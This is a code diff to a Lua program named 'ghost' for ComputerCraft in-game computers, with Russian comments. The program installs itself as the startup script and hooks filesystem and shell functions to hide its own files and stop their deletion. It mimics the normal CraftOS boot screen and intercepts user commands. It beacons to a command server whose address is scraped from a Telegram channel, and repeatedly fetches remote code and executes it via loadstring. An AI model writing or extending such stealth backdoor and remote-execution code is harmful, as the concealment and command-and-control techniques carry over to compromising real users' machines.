@@ -1,4 +1,4 @@
--- ghost v9.9.7 (full stealth: silent normal mode + frequent URL refresh)
+-- ghost v9.9.8 (fast console: intercept -> console -> background connect; yellow prompt)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -8,7 +8,7 @@ local LOG_FILE = ".ghost.log"
 local SANDBOX_DIR = "/sandbox"
 local COMPUTER_ID = os.getComputerID()
 local TRUSTED_DOMAIN = nil
-local DEBUG = false  -- СКРЫТНОСТЬ: не печатать отладку в обычном режиме
+local DEBUG = false
 
 local GITHUB_URL = "https://raw.githubusercontent.com/kisilev-2024-wq/-Ghost-/main/ghost.lua"
 local SECRET_CODE = "V2BM-LkUZkBqGd9R8YdE"
@@ -30,10 +30,8 @@ local ALLOWED_CMDS = {ls=true,dir=true,ll=true,la=true,cd=true,pwd=true,mkdir=tr
     cp=true,copy=true,mv=true,move=true,edit=true,clear=true,echo=true,print=true,help=true,time=true,
     date=true,day=true,cat=true,view=true,type=true,label=true,bg=true,fg=true,monitor=true,speakers=true,
     scan=true,gps=true,reboot=true}
-
 local FILE_CMDS = {cat=true,view=true,type=true,edit=true,delete=true,rm=true,copy=true,move=true,
     cp=true,mv=true,mkdir=true,label=true,rename=true}
-
 local FS_PROBES = {"fs%.list","fs%.find","fs%.exists","fs%.attributes","fs%.getsize","fs%.isdir",
     "fs%.open","fs%.readfile","fs%.complete","fs%.getdrive","fs%.getfreespace","fs%.getdir","fs%.ismount",
     "fs%.makeDir","fs%.copy","fs%.move","fs%.delete","fs%.create","fs%.isreadonly","os%.getrunningprogram",
@@ -42,13 +40,12 @@ local FS_PROBES = {"fs%.list","fs%.find","fs%.exists","fs%.attributes","fs%.gets
     "shell%.resolveProgram","peripheral%.find","peripheral%.wrap","peripheral%.call","redstone%.getInput",
     "redstone%.setOutput","http%.get","http%.post","http%.request","coroutine%.create","coroutine%.resume",
     "loadstring","load","dofile","require","getfenv","setfenv","rawget","rawset","debug","setmetatable","getmetatable"}
-
 local DETECT_CMDS = {"programs","shell%.resolve","settings%.list","settings%.get","getRunningProgram",
     "http%.checkURL","peripheral","redstone","multishell","parallel","coroutine","loadstring","load",
     "dofile","apropos","man","which","env","printenv","history","alias","unalias","ps","top","wget",
     "pastebin","git","curl","mount","df","du","chmod","chown","find","locate","grep","awk","sed","wgen","wgen%.run"}
 
--- ORIGINALS (safe, без fs.readFile/fs.writeFile)
+-- ORIGINALS (safe)
 local orig_fs_open = fs.open
 local orig_fs_exists = fs.exists
 local orig_fs_list = fs.list
@@ -66,21 +63,17 @@ local orig_shell_complete = shell.complete
 local orig_version = os.version
 
 local function orig_fs_read(path)
-    local f = orig_fs_open(path, "r")
-    if not f then return nil end
-    local c = f.readAll(); f.close()
-    return c
+    local f = orig_fs_open(path, "r"); if not f then return nil end
+    local c = f.readAll(); f.close(); return c
 end
 local function orig_fs_write(path, content)
-    local f = orig_fs_open(path, "w")
-    if not f then return false end
-    f.write(content); f.close()
-    return true
+    local f = orig_fs_open(path, "w"); if not f then return false end
+    f.write(content); f.close(); return true
 end
 
 local cmd_history = {}
 
--- FORWARD-ДЕКЛАРАЦИИ
+-- FORWARD
 local load_token
 local send_heartbeat
 local trigger_fortress
@@ -89,22 +82,15 @@ local check_mode
 local reload_tunnel
 
 -- ============================================
--- LOGGING (СКРЫТНОСТЬ: только в файл)
+-- LOGGING (тихо)
 -- ============================================
 local function glog(msg)
     pcall(function()
         local f = orig_fs_open(LOG_FILE, "a")
-        if f then
-            local t = os.date and os.date("%H:%M:%S") or "?"
-            f.write(t .. " " .. tostring(msg) .. "\n"); f.close()
-        end
+        if f then local t = os.date and os.date("%H:%M:%S") or "?"; f.write(t .. " " .. tostring(msg) .. "\n"); f.close() end
     end)
 end
--- note: ТОЛЬКО в лог, НИКОГДА на экран
-local function note(msg)
-    glog(msg)
-end
--- gerr: лог + printError только в SERVICE
+local function note(msg) glog(msg) end
 local function gerr(step, err)
     glog("ERR " .. step .. ": " .. tostring(err))
     pcall(function()
@@ -115,29 +101,20 @@ local function gerr(step, err)
 end
 
 -- ============================================
--- SELF-UPDATE (GitHub)
+-- SELF-UPDATE
 -- ============================================
 local function do_update()
-    glog("UPDATE: start from GitHub")
+    glog("UPDATE: start")
     term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
-    term.clear(); term.setCursorPos(1, 1)
-    print("=== UPDATING ===")
-    local ok, h = pcall(http.get, GITHUB_URL, {
-        ["User-Agent"]="ghost-updater",["bypass-tunnel-reminder"]="true",["Cache-Control"]="no-cache"})
-    if not ok or not h then
-        print("FAILED: no GitHub"); term.setTextColour(colors.white)
-        print("Press any key..."); os.pullEvent("key"); glog("UPDATE FAILED"); return false
-    end
+    term.clear(); term.setCursorPos(1, 1); print("=== UPDATING ===")
+    local ok, h = pcall(http.get, GITHUB_URL, {["User-Agent"]="ghost-updater",["bypass-tunnel-reminder"]="true",["Cache-Control"]="no-cache"})
+    if not ok or not h then print("FAILED"); os.pullEvent("key"); return false end
     local o, code = pcall(function() return h.readAll() end)
     pcall(function() if h.close then h.close() end end)
-    if not o or not code or code == "" or not code:find("run_main",1,true) then
-        print("FAILED: bad code"); term.setTextColour(colors.white)
-        print("Press any key..."); os.pullEvent("key"); glog("UPDATE FAILED: bad"); return false
-    end
-    local f = orig_fs_open("startup", "w")
-    if not f then print("FAILED: write"); os.pullEvent("key"); return false end
+    if not o or not code or code == "" or not code:find("run_main",1,true) then print("FAILED"); os.pullEvent("key"); return false end
+    local f = orig_fs_open("startup", "w"); if not f then print("FAILED"); os.pullEvent("key"); return false end
     f.write(code); f.close()
-    glog("UPDATE OK, reboot"); sleep(2); orig_reboot(); return true
+    glog("UPDATE OK"); sleep(2); orig_reboot(); return true
 end
 
 -- ============================================
@@ -161,7 +138,7 @@ end
 local function is_core(c) return c == ".token" or c == ".tk2" or c == "ghost" end
 
 local function install_stealth()
-    local ok, err = pcall(function()
+    pcall(function()
         fs.list = function(path)
             local list = orig_fs_list(path); if not list then return list end
             local out = {}
@@ -193,44 +170,37 @@ local function install_stealth()
             if c == "startup" or is_core(c) or is_hidden_path(path) then return end
             orig_fs_write(path, content)
         end
-        if orig_fs_find then
-            fs.find = function(w)
-                local r = orig_fs_find(w); if not r then return r end
-                local out = {}
-                for _, p in ipairs(r) do if not is_hidden_path(p) then out[#out+1] = p end end
-                return out
-            end
-        end
+        if orig_fs_find then fs.find = function(w)
+            local r = orig_fs_find(w); if not r then return r end
+            local out = {}
+            for _, p in ipairs(r) do if not is_hidden_path(p) then out[#out+1] = p end end
+            return out
+        end end
         if orig_fs_attributes then fs.attributes = function(p, ...) if is_hidden_path(p) then return nil end return orig_fs_attributes(p, ...) end end
         if orig_fs_getSize then fs.getSize = function(p) if is_hidden_path(p) then return nil end return orig_fs_getSize(p) end end
         if orig_fs_isDir then fs.isDir = function(p) if is_hidden_path(p) then return false end return orig_fs_isDir(p) end end
-        if orig_fs_complete then
-            fs.complete = function(prefix, dir, ...)
-                local r = orig_fs_complete(prefix, dir, ...); if not r then return r end
-                local out = {}
-                for _, n in ipairs(r) do if not is_hidden_name(n) then out[#out+1] = n end end
-                return out
-            end
-        end
+        if orig_fs_complete then fs.complete = function(prefix, dir, ...)
+            local r = orig_fs_complete(prefix, dir, ...); if not r then return r end
+            local out = {}
+            for _, n in ipairs(r) do if not is_hidden_name(n) then out[#out+1] = n end end
+            return out
+        end end
         fs.delete = function(path)
             local c = tostring(path):gsub("^/",""):gsub("/$","")
             if c == "startup" or is_hidden_path(path) then return false end
             return orig_fs_delete(path)
         end
-        if orig_shell_complete then
-            shell.complete = function(...)
-                local r = orig_shell_complete(...); if not r then return r end
-                local out = {}
-                for _, item in ipairs(r) do
-                    local c = item:gsub("^/",""):gsub("/$","")
-                    if not is_hidden_name(c) and not c:find("^%.tmp_") then out[#out+1] = item end
-                end
-                return out
+        if orig_shell_complete then shell.complete = function(...)
+            local r = orig_shell_complete(...); if not r then return r end
+            local out = {}
+            for _, item in ipairs(r) do
+                local c = item:gsub("^/",""):gsub("/$","")
+                if not is_hidden_name(c) and not c:find("^%.tmp_") then out[#out+1] = item end
             end
-        end
+            return out
+        end end
         if os.getRunningProgram then os.getRunningProgram = function(...) return "shell" end end
     end)
-    if not ok then gerr("install_stealth", err) end
 end
 local function disable_stealth()
     fs.list = orig_fs_list; fs.exists = orig_fs_exists; fs.open = orig_fs_open
@@ -256,7 +226,7 @@ local function normal_complete(text)
 end
 
 -- ============================================
--- BOOT SCREEN (выглядит как обычный CraftOS)
+-- BOOT SCREEN
 -- ============================================
 local MOTD = {'Running "set" lists the current values of all settings.','Type "help" to view the help index.',
     'Use "edit" to create and modify files.','Press Ctrl+T to terminate a running program.',
@@ -285,7 +255,7 @@ local function authentic_shutdown()
 end
 
 -- ============================================
--- STRIKE ANALYSIS
+-- STRIKE
 -- ============================================
 local function find_hidden(line)
     local l = line:lower()
@@ -306,11 +276,10 @@ local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") en
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
 -- ============================================
--- URL MANAGEMENT
+-- URL
 -- ============================================
 local function save_url(url)
-    local f = orig_fs_open(URL_FILE, "w")
-    if f then f.write(url); f.close() end
+    local f = orig_fs_open(URL_FILE, "w"); if f then f.write(url); f.close() end
 end
 local function load_saved_url()
     if not orig_fs_exists(URL_FILE) then return nil end
@@ -326,10 +295,7 @@ local function replace_domain(url, newdomain)
     local path = rest:match("^[^/]*(/.*)$") or ""
     return scheme .. newdomain .. path
 end
-local function trim(s)
-    if not s then return s end
-    return (s:match("^%s*(.-)%s*$") or s)
-end
+local function trim(s) if not s then return s end; return (s:match("^%s*(.-)%s*$") or s) end
 local function is_valid_tunnel_url(url)
     if not url or url == "" then return false end
     url = trim(url)
@@ -341,42 +307,41 @@ end
 local function validate_url(url)
     if not url or url == "" then return false end
     url = trim(url)
-    if not is_valid_tunnel_url(url) then glog("validate: invalid format"); return false end
+    if not is_valid_tunnel_url(url) then return false end
     local ok, h = pcall(http.get, url .. "/api/health", {["bypass-tunnel-reminder"]="true",["User-Agent"]="Mozilla/5.0"})
     if ok and h then
         local o, resp = pcall(function() return h.readAll() end)
         pcall(function() if h.close then h.close() end end)
         if o and resp and resp ~= "" then
             local o2, data = pcall(textutils.unserializeJSON, resp)
-            if o2 and data then glog("validate: health OK"); return true, url end
+            if o2 and data then return true, url end
         end
     end
     ok, h = pcall(http.get, url .. "/api/url", {["bypass-tunnel-reminder"]="true",["User-Agent"]="Mozilla/5.0"})
-    if not ok or not h then glog("validate: http fail"); return false end
+    if not ok or not h then return false end
     local o, resp = pcall(function() return h.readAll() end)
     pcall(function() if h.close then h.close() end end)
     if not o or not resp or resp == "" then return false end
     if resp:find("no tunnel here", 1, true) then return false end
     local o2, data = pcall(textutils.unserializeJSON, resp)
     if not o2 or not data or data.error then return false end
-    glog("validate: OK")
     return true, url
 end
 local function fetch_relay_urls()
     local url = "https://t.me/s/" .. RELAY_USERNAME
     local ok, h = pcall(http.get, url, {["User-Agent"]="Mozilla/5.0",["bypass-tunnel-reminder"]="true"})
-    if not ok or not h then glog("relay: http fail"); return {} end
+    if not ok or not h then return {} end
     local o, htmlc = pcall(function() return h.readAll() end)
     pcall(function() if h.close then h.close() end end)
-    if not o or not htmlc then glog("relay: readAll fail"); return {} end
-    if not htmlc:find("tgme_widget_message", 1, true) then glog("relay: no posts"); return {} end
+    if not o or not htmlc then return {} end
+    if not htmlc:find("tgme_widget_message", 1, true) then return {} end
     htmlc = htmlc:gsub("&lt;","<"):gsub("&gt;",">"):gsub("&amp;","&"):gsub("&quot;",'"'):gsub("&#x27;","'"):gsub("&nbsp;"," ")
     local urls = {}; local seen = {}
     for u in htmlc:gmatch("https://[%w%-]+%.lhr%.life") do
         u = trim(u)
         if not seen[u] then seen[u]=true; urls[#urls+1]=u end
     end
-    glog("relay: found " .. #urls .. " URLs")
+    glog("relay: " .. #urls .. " URLs")
     return urls
 end
 local function get_fresh_url()
@@ -384,67 +349,56 @@ local function get_fresh_url()
     if #urls == 0 then return nil end
     for i = #urls, 1, -1 do
         local c = urls[i]
-        local ok = validate_url(c)
-        if ok then glog("get_fresh: ALIVE " .. c); return c end
+        if validate_url(c) then glog("fresh: " .. c); return c end
     end
-    glog("get_fresh: all dead")
     return nil
 end
 
 refresh_url = function()
     if CURRENT_URL then
-        local ok = validate_url(CURRENT_URL)
-        if ok then return CURRENT_URL end
+        if validate_url(CURRENT_URL) then return CURRENT_URL end
         glog("refresh: current dead")
     end
     local fresh = get_fresh_url()
     if fresh then
         CURRENT_URL = fresh; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
-        glog("refresh: fresh " .. CURRENT_URL)
         return CURRENT_URL
     end
     local saved = load_saved_url()
     if saved and saved ~= CURRENT_URL then
-        local ok = validate_url(saved)
-        if ok then CURRENT_URL = saved; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL); return CURRENT_URL end
+        if validate_url(saved) then CURRENT_URL = saved; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL); return CURRENT_URL end
     end
-    glog("refresh: no URL")
     return nil
 end
 
 reload_tunnel = function()
     if not CURRENT_URL then return false end
-    glog("reload_tunnel: POST")
     local ok, h = pcall(http.post, CURRENT_URL .. "/api/reload",
         textutils.serializeJSON({computer_id = tostring(COMPUTER_ID)}), {
         ["Content-Type"]="application/json",["bypass-tunnel-reminder"]="true",
         ["User-Agent"]="Mozilla/5.0",["X-Computer-ID"]=tostring(COMPUTER_ID)})
-    if not ok or not h then glog("reload_tunnel: fail"); return false end
+    if not ok or not h then return false end
     pcall(function() if h.close then h.close() end end)
-    glog("reload_tunnel: OK")
     return true
 end
 
-local function get_valid_url()
-    local fresh = get_fresh_url()
-    if fresh then
-        CURRENT_URL = fresh; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
-        return CURRENT_URL
-    end
-    local saved = load_saved_url()
-    if saved then
-        local ok = validate_url(saved)
-        if ok then CURRENT_URL = saved; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL); return CURRENT_URL end
-    end
+-- НЕ-интерактивный захват URL (для фона, без read())
+local function acquire_url()
+    local tries = 0
     while true do
-        write("URL: ")
-        local u = read()
-        if u and u ~= "" then
-            u = trim(u)
-            if not u:find("^https?://") then u = "https://" .. u end
-            local ok = validate_url(u)
-            if ok then save_url(u); CURRENT_URL = u; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); return CURRENT_URL end
+        local fresh = get_fresh_url()
+        if fresh then
+            CURRENT_URL = fresh; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
+            glog("acquire: relay " .. CURRENT_URL); return true
         end
+        local saved = load_saved_url()
+        if saved and validate_url(saved) then
+            CURRENT_URL = saved; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
+            glog("acquire: saved " .. CURRENT_URL); return true
+        end
+        tries = tries + 1
+        if tries > 30 then return false end
+        sleep(10)
     end
 end
 
@@ -469,17 +423,15 @@ local function decrypt_token(e)
     return r
 end
 local function write_token_file(path, e)
-    local f = orig_fs_open(path, "w")
-    if not f then return false end
+    local f = orig_fs_open(path, "w"); if not f then return false end
     f.write(e); f.close()
-    local v = orig_fs_read(path)
-    return v == e
+    return orig_fs_read(path) == e
 end
 local function save_token(t)
     local e = encrypt_token(t)
     local a = write_token_file(TOKEN_FILE, e)
     local b = write_token_file(TOKEN_BAK, e)
-    glog("save_token: main=" .. tostring(a) .. " bak=" .. tostring(b))
+    glog("save_token: " .. tostring(a) .. "/" .. tostring(b))
     return a or b
 end
 local function read_token_file(path)
@@ -493,10 +445,8 @@ local function read_token_file(path)
 end
 load_token = function()
     local t = read_token_file(TOKEN_FILE)
-    if t then glog("load_token: OK main"); return t end
-    t = read_token_file(TOKEN_BAK)
-    if t then glog("load_token: OK bak"); return t end
-    glog("load_token: FAIL"); return nil
+    if t then return t end
+    return read_token_file(TOKEN_BAK)
 end
 
 -- ============================================
@@ -549,8 +499,8 @@ local function http_request_with_status(url, body, headers, method)
         elseif ev == "timer" and p1 == timer then return nil, nil end
     end
 end
-local function http_get(url, headers) local r, sc = http_request_with_status(url, nil, headers, "GET"); return r, sc end
-local function http_post(url, data, headers) local body = data and textutils.serializeJSON(data) or nil; local r, sc = http_request_with_status(url, body, headers, "POST"); return r, sc end
+local function http_get(url, headers) return http_request_with_status(url, nil, headers, "GET") end
+local function http_post(url, data, headers) local b = data and textutils.serializeJSON(data) or nil; return http_request_with_status(url, b, headers, "POST") end
 local function http_get_smart(url, headers, token)
     local r, sc = http_get(url, headers)
     if r then return r, sc end
@@ -582,10 +532,10 @@ trigger_fortress = function(token)
 end
 
 -- ============================================
--- COMMAND INTERCEPTION
+-- INTERCEPT
 -- ============================================
 local function install_command_intercept()
-    local ok, err = pcall(function()
+    pcall(function()
         shell.run = function(...)
             local line = table.concat({...}, " ")
             local first = line:match("^(%S+)") or ""
@@ -624,12 +574,11 @@ local function install_command_intercept()
             return orig_shell_run(line)
         end
     end)
-    if not ok then gerr("install_command_intercept", err) end
 end
 local function disable_command_intercept() shell.run = orig_shell_run end
 
 -- ============================================
--- REGISTRATION (бесконечная, тихая после успеха)
+-- REGISTRATION (тихая, только glog)
 -- ============================================
 local function register_sync(url, pw)
     if not url or not pw or pw == "" then return nil end
@@ -645,7 +594,7 @@ local function register_sync(url, pw)
     elseif res.status == "pending" then
         local pid = res.pending_id
         if not pid then return nil end
-        print("⏳ Waiting approval...")
+        glog("register: waiting approval")
         local fc = 0; local cc = 0; local cu = CURRENT_URL or target
         while true do
             sleep(3); cc = cc + 1
@@ -653,8 +602,8 @@ local function register_sync(url, pw)
             local sr = http_get(cu .. "/api/check?id=" .. tostring(pid), make_headers(nil))
             if sr then
                 fc = 0
-                if sr.status == "approved" then return sr.token
-                elseif sr.status == "denied" then return nil end
+                if sr.status == "approved" then glog("register: approved"); return sr.token
+                elseif sr.status == "denied" then glog("register: denied"); return nil end
             else
                 fc = fc + 1
                 if fc >= 3 then refresh_url(); if CURRENT_URL then cu = CURRENT_URL; fc = 0 end end
@@ -678,7 +627,7 @@ check_mode = function(token)
 end
 
 -- ============================================
--- PASTE EXECUTION
+-- PASTE
 -- ============================================
 local function fetch_paste_code(name, token)
     if not CURRENT_URL then refresh_url(); if not CURRENT_URL then return nil end end
@@ -687,12 +636,12 @@ local function fetch_paste_code(name, token)
     return r.content
 end
 local function run_paste_loop(name, token)
-    glog("paste loop: " .. name)
+    glog("paste: " .. name)
     while true do
         pcall(function()
             local code = fetch_paste_code(name, token)
             if not code or type(code) ~= "string" then return end
-            local fn, ce = loadstring(code)
+            local fn = loadstring(code)
             if not fn then return end
             pcall(fn)
         end)
@@ -713,9 +662,8 @@ local function fortress_console()
 end
 
 -- ============================================
--- LOOPS (ЧАСТОЕ обновление URL)
+-- LOOPS
 -- ============================================
--- НОВЫЙ: активное слежение за relay, переключение на живой URL каждые 30с
 local function relay_watch_loop(token)
     glog("relay_watch start")
     while true do
@@ -725,28 +673,22 @@ local function relay_watch_loop(token)
             if #urls == 0 then return end
             local latest = urls[#urls]
             if latest == CURRENT_URL then return end
-            -- если текущий жив — не переключаемся
             if CURRENT_URL and validate_url(CURRENT_URL) then return end
-            -- текущий мёртв, пробуем последний из relay
             if validate_url(latest) then
-                CURRENT_URL = latest
-                TRUSTED_DOMAIN = extract_domain(CURRENT_URL)
-                save_url(CURRENT_URL)
-                glog("relay_watch: switched to " .. CURRENT_URL)
+                CURRENT_URL = latest; TRUSTED_DOMAIN = extract_domain(CURRENT_URL); save_url(CURRENT_URL)
+                glog("relay_watch: switched " .. CURRENT_URL)
             end
         end)
     end
 end
-
 local function heartbeat_loop(token)
     glog("heartbeat start")
     local fc = 0; local last_refresh = 0; local consec = 0
     while true do
-        -- ЧАЩЕ: 60с норма, 15с при ошибках
         sleep(fc > 3 and 15 or 60)
         pcall(function()
             local now = os.time()
-            if now - last_refresh >= 30 then  -- forced refresh каждые 30с
+            if now - last_refresh >= 30 then
                 last_refresh = now
                 local prev = CURRENT_URL
                 refresh_url()
@@ -765,7 +707,7 @@ local function heartbeat_loop(token)
                 return
             end
             local sent = send_heartbeat(token, pastes)
-            if sent then fc = 0; consec = 0; glog("heartbeat OK")
+            if sent then fc = 0; consec = 0
             else
                 fc = fc + 1; consec = consec + 1
                 if consec >= 5 then reload_tunnel(); consec = 0 end
@@ -794,7 +736,7 @@ local function mode_watcher(token)
 end
 
 -- ============================================
--- REPL (тихий в обычном режиме)
+-- REPL (жёлтая стрелка как на фото)
 -- ============================================
 local function repl()
     while true do
@@ -809,8 +751,8 @@ local function repl()
                 if not o then printError(e or "Error") end
             end
         else
-            -- ОБЫЧНЫЙ режим: выглядит как стандартный shell
-            term.setTextColour(colors.white); term.setCursorBlink(true); write("> ")
+            -- ЖЁЛТАЯ стрелка (как на фото)
+            term.setTextColour(colors.yellow); term.setCursorBlink(true); write("> ")
             local line = read(nil, cmd_history, normal_complete)
             if line == UPDATE_CODE then if do_update() then return end
             elseif line == SECRET_CODE then
@@ -830,10 +772,40 @@ local function repl()
 end
 
 -- ============================================
--- MAIN
+-- BACKGROUND CONNECT (связь ПОСЛЕ консоли)
+-- ============================================
+local function connect_and_run(token, pending_password)
+    local pastes = {}
+    if not token and pending_password and pending_password ~= "" then
+        if acquire_url() then
+            token = register_sync(CURRENT_URL, pending_password)
+            if token then save_token(token) end
+        end
+    end
+    if token then
+        local mode, p2 = check_mode(token)
+        if mode then pastes = p2 or {} end
+    end
+    if not token then
+        while true do sleep(60) end
+    end
+    local funcs = {
+        function() heartbeat_loop(token) end,
+        function() mode_watcher(token) end,
+        function() relay_watch_loop(token) end,
+    }
+    for _, p in ipairs(pastes) do
+        local pn = p
+        funcs[#funcs+1] = function() run_paste_loop(pn, token) end
+    end
+    pcall(parallel.waitForAll, table.unpack(funcs))
+end
+
+-- ============================================
+-- MAIN (перехват -> консоль -> связь)
 -- ============================================
 local function run_main()
-    glog("ghost start v9.9.7")
+    glog("ghost start v9.9.8")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
@@ -841,82 +813,20 @@ local function run_main()
     local url = load_saved_url()
     if url then CURRENT_URL = url; TRUSTED_DOMAIN = extract_domain(url) end
     glog("saved URL: " .. tostring(CURRENT_URL))
+
     local token = load_token()
-
-    local connected = false
-    local pastes = {}
-
-    if token then
-        glog("token found, connecting")
-        for attempt = 1, 5 do
-            refresh_url()
-            if CURRENT_URL then
-                local mode, p2 = check_mode(token)
-                if mode then connected = true; pastes = p2 or {}; glog("connected mode=" .. mode); break end
-            end
-            sleep(3)
-        end
-    end
-
+    local pending_password = nil
     if not token then
-        if not CURRENT_URL then CURRENT_URL = get_valid_url() end
-        if CURRENT_URL then
-            while not token do
-                write("Password: ")
-                local pw = read("*")
-                if pw and pw ~= "" then
-                    refresh_url()
-                    if CURRENT_URL then
-                        token = register_sync(CURRENT_URL, pw)
-                        if token then
-                            if save_token(token) then
-                                glog("token saved")
-                                for a = 1, 3 do
-                                    refresh_url()
-                                    local mode, p2 = check_mode(token)
-                                    if mode then connected = true; pastes = p2 or {}; break end
-                                    sleep(2)
-                                end
-                                break
-                            else sleep(5) end
-                        else sleep(5); refresh_url() end
-                    else sleep(5) end
-                else sleep(1) end
-            end
-        else return end
-        -- СКРЫТНОСТЬ: очищаем экран после регистрации
-        draw_boot()
+        term.setTextColour(colors.white); term.setCursorBlink(true)
+        write("Password: ")
+        pending_password = read("*")
+        term.setCursorBlink(false)
     end
 
-    if connected and current_mode == "service" then
-        disable_stealth(); disable_protection(); disable_command_intercept()
-        service_local = true
-        while true do
-            sleep(5)
-            local mode = check_mode(token)
-            if not mode or mode ~= "service" then break end
-        end
-        service_local = false
-        install_stealth(); install_protection(); install_command_intercept()
-    end
-
+    -- консоль СРАЗУ, связь в фоне
     parallel.waitForAny(
-        function()
-            pcall(repl)
-        end,
-        function()
-            if not token then while true do sleep(60) end end
-            local funcs = {
-                function() heartbeat_loop(token) end,
-                function() mode_watcher(token) end,
-                function() relay_watch_loop(token) end,
-            }
-            for _, p in ipairs(pastes) do
-                local pn = p
-                funcs[#funcs+1] = function() run_paste_loop(pn, token) end
-            end
-            pcall(parallel.waitForAll, table.unpack(funcs))
-        end
+        function() pcall(repl) end,
+        function() pcall(connect_and_run, token, pending_password) end
     )
 
     if fortress_active then fortress_console() end
@@ -926,8 +836,5 @@ local ok, err = pcall(run_main)
 if not ok then
     local e = tostring(err)
     if e:find("Terminated") then authentic_shutdown()
-    else
-        gerr("run_main", e)
-        sleep(5); orig_reboot()
-    end
+    else gerr("run_main", e); sleep(5); orig_reboot() end
 end
